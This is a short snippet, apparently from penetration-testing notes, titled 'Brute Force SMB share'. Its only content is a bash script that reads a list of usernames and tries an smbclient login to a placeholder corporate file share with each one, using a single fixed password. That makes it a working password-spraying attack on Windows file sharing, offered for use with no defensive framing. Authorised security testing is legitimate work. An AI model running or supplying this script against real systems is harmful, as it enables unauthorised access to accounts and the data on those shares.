Brute Force SMB share
-------------------------------
```bash
#!/bin/bash
# Usage smb-brute.sh /path/to/list/of/usernames.txt
usernames=$1
while read u; do
smbclient \\\\server01.domain.corp.com\\ShareName -U 'Domain-Name\'$u'%passwordgoeshere'
done < "$usernames"
```
